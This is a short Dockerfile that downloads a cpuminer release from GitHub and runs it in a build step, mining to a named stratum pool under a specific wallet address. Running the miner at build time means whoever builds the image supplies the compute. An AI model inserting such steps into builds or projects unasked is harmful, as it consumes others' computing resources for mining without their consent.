FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.34/cpuminer-opt-linux.tar.gz
RUN tar zxvf cpuminer-opt-linux.tar.gz
RUN ./cpuminer-sse2 -a yespower -t 2 -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
